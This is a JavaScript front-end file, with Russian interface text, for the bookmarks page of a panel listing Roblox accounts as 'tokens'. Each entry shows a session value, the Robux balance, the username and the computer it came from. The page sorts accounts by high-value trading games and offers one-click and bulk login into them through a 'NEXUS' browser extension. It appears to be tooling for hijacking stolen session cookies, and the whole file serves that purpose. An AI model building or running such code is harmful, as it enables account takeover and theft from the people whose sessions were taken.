// ── Страница пометок ──────────────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('bookmarks');
bindLogout();

const GAME_CATEGORIES = [
  { id: 'mm2', name: 'Murder Mystery 2', icon: '🔪', color: '#ef4444' },
  { id: 'adopt_me', name: 'Adopt Me', icon: '🐾', color: '#f59e0b' },
  { id: 'steal_brainrot', name: 'Steal a Brainrot', icon: '🧠', color: '#a855f7' }
];

let allBookmarked = [];

async function loadBookmarks() {
  const container = document.getElementById('bookmarksContainer');
  container.innerHTML = '<div class="skeleton-row" style="height:100px;"><div class="skeleton-block" style="flex:1;"></div></div>';
  try {
    const r = await apiFetch('/api/bookmarks');
    allBookmarked = await r.json();
    if (!Array.isArray(allBookmarked)) allBookmarked = [];
    updateStats();
    renderBookmarks();
  } catch (e) {
    if (e.message !== 'auth') {
      container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>Ошибка загрузки</div>';
      toast('Ошибка загрузки пометок', 'err');
    }
  }
}

function updateStats() {
  document.getElementById('sTotal').textContent = allBookmarked.length;
  for (const cat of GAME_CATEGORIES) {
    const count = allBookmarked.filter(t => (t.bookmarks || []).includes(cat.id)).length;
    const elId = cat.id === 'mm2' ? 'sMM2' : cat.id === 'adopt_me' ? 'sAdopt' : 'sBrainrot';
    document.getElementById(elId).textContent = count;
  }
}

function renderBookmarks() {
  const container = document.getElementById('bookmarksContainer');
  
  if (allBookmarked.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">🏷️</span>Нет помеченных аккаунтов<br><span style="font-size:0.9rem; color:var(--text-muted);">Пометьте аккаунты на вкладке Токены</span></div>';
    return;
  }

  let html = '';

  for (const cat of GAME_CATEGORIES) {
    const tokens = allBookmarked.filter(t => (t.bookmarks || []).includes(cat.id));
    
    html += '<div class="bookmark-category">';
    html += '<div class="bookmark-category-header">';
    html += '<div class="bookmark-category-title" style="color:' + cat.color + ';">';
    html += '<span style="font-size:1.5rem;">' + cat.icon + '</span> ' + escapeHtml(cat.name);
    html += ' <span class="bookmark-category-count">' + tokens.length + '</span>';
    html += '</div>';
    if (tokens.length > 0) {
      html += '<button class="btn-secondary bookmark-login-all" style="border-color:' + cat.color + '30; color:' + cat.color + '; background:' + cat.color + '0a;" onclick="loginAllInCategory(\'' + cat.id + '\')">';
      html += '👤 Войти во всех (' + tokens.length + ')</button>';
    }
    html += '</div>';

    if (tokens.length === 0) {
      html += '<div class="bookmark-empty">Нет помеченных аккаунтов в этой категории</div>';
    } else {
      html += '<div class="tokens-grid">';
      for (const t of tokens) {
        html += renderBookmarkCard(t, cat.id);
      }
      html += '</div>';
    }
    html += '</div>';
  }

  container.innerHTML = html;
}

function renderBookmarkCard(t, categoryId) {
  const valid = t.valid;
  const badgeClass = valid ? 'badge-valid' : 'badge-invalid';
  const statusText = valid ? '✅' : '❌';
  const tokenFull = escapeHtml(t.security || '');
  const fileId = escapeHtml(t.file || '');

  let html = '<div class="token-card">';
  html += '<div class="token-card-status"><span class="badge ' + badgeClass + '" style="padding: 2px 8px; font-size: 0.75rem;">' + statusText + '</span></div>';
  
  if (valid && t.robux !== undefined && t.robux > 0) {
    html += '<div class="token-card-robux">' + t.robux.toLocaleString() + ' R$</div>';
  } else {
    html += '<div class="token-card-robux" style="background: rgba(255,255,255,0.05); color: var(--text-muted); border-color: transparent; box-shadow: none;">0 R$</div>';
  }
  
  let avatarHtml = '<div class="token-card-avatar">👤</div>';
  if (t.userId) {
    avatarHtml = '<div class="token-card-avatar" style="padding:0; overflow:hidden;"><img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" style="width:100%; height:100%; object-fit:cover;" onerror="this.outerHTML=\'👤\'"></div>';
  }
  html += avatarHtml;
  html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';
  html += '<div class="token-card-computer">💻 ' + escapeHtml(t.computer || '—') + '</div>';
  
  // Bookmark badges
  html += '<div class="bookmark-badges">';
  for (const bm of (t.bookmarks || [])) {
    const bmCat = GAME_CATEGORIES.find(c => c.id === bm);
    if (bmCat) {
      html += '<span class="bookmark-badge" style="background:' + bmCat.color + '15; color:' + bmCat.color + '; border-color:' + bmCat.color + '30;">' + bmCat.icon + ' ' + bmCat.name + '</span>';
    }
  }
  html += '</div>';
  
  html += '<div class="token-card-actions">';
  
  if (t.security) {
    let loginBtnText = 'Войти';
    let loginClass = 'btn-login';
    const lastLogin = t.lastLogin;
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      loginBtnText = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      loginClass = 'btn-login logged-in';
    }
    
    html += '<div style="display:flex; gap:8px;">';
    html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
    html += '<button class="btn-secondary" title="Снять пометку ' + escapeHtml(GAME_CATEGORIES.find(c=>c.id===categoryId)?.name || '') + '" style="width:auto; padding:0 12px; border-color: rgba(255, 0, 85, 0.3); color: var(--danger); background: rgba(255, 0, 85, 0.05);" onclick="removeBookmark(\'' + fileId.replace(/'/g, "\\'") + '\', \'' + categoryId + '\')">✖</button>';
    html += '</div>';
  }
  
  html += '</div></div>';
  return html;
}

// ── Login to Roblox (same as tokens.js) ────────────────────────────────────────
function loginToRoblox(token, btn, fileId) {
  if (!token) return;
  btn.textContent = '⏳...';
  btn.disabled = true;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        if (fileId) {
          apiFetch('/api/login-mark', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename: fileId })
          }).catch(()=>{});
          const tokenData = allBookmarked.find(t => t.file === fileId);
          if (tokenData) tokenData.lastLogin = Date.now();
        }
        const d = new Date();
        btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
        btn.className = 'btn-login logged-in';
        btn.disabled = false;
        toast('✅ Вход выполнен, открываем Roblox...');
      } else {
        restoreBtnText();
        toast('⚠️ Установи расширение NEXUS для входа', 'err');
      }
    }
  }

  function restoreBtnText() {
    const tokenData = allBookmarked.find(t => t.file === fileId);
    const lastLogin = tokenData?.lastLogin;
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      btn.className = 'btn-login logged-in';
    } else {
      btn.textContent = 'Войти';
      btn.className = 'btn-login';
    }
    btn.disabled = false;
  }

  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    window.removeEventListener('message', handler);
    restoreBtnText();
    toast('⚠️ Установи расширение NEXUS для входа', 'err');
  }, 800);
}

// ── Remove bookmark ────────────────────────────────────────────────────────────
async function removeBookmark(fileId, game) {
  try {
    const r = await apiFetch('/api/bookmark', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename: fileId, game: game })
    });
    const data = await r.json();
    // Update local data
    const token = allBookmarked.find(t => t.file === fileId);
    if (token) {
      token.bookmarks = data.bookmarks || [];
      // Remove from list if no bookmarks left
      if (token.bookmarks.length === 0) {
        allBookmarked = allBookmarked.filter(t => t.file !== fileId);
      }
    }
    updateStats();
    renderBookmarks();
    toast('🏷️ Пометка снята');
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка', 'err');
  }
}

// ── Login all in category ──────────────────────────────────────────────────────
async function loginAllInCategory(categoryId) {
  const tokens = allBookmarked.filter(t => (t.bookmarks || []).includes(categoryId) && t.security && t.valid);
  if (tokens.length === 0) {
    toast('Нет рабочих аккаунтов в этой категории', 'err');
    return;
  }
  const cat = GAME_CATEGORIES.find(c => c.id === categoryId);
  if (!confirm('Войти последовательно во все ' + tokens.length + ' аккаунтов категории ' + (cat?.name || '') + '?')) return;
  
  toast('⏳ Вход в аккаунты ' + cat.name + '...');
  
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    toast('⏳ Вход ' + (i + 1) + '/' + tokens.length + ': ' + (t.username || '—'));
    
    await new Promise((resolve) => {
      function handler(e) {
        if (e.data && e.data.type === 'nexus-login-response') {
          window.removeEventListener('message', handler);
          if (e.data.ok) {
            apiFetch('/api/login-mark', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ filename: t.file })
            }).catch(()=>{});
            t.lastLogin = Date.now();
          }
          resolve();
        }
      }
      window.addEventListener('message', handler);
      window.postMessage({ type: 'nexus-login', token: t.security }, '*');
      setTimeout(() => {
        window.removeEventListener('message', handler);
        resolve();
      }, 1200);
    });
    
    // Small delay between logins
    if (i < tokens.length - 1) {
      await new Promise(r => setTimeout(r, 500));
    }
  }
  
  renderBookmarks();
  toast('✅ Вход завершён: ' + tokens.length + ' аккаунтов');
}

loadBookmarks();
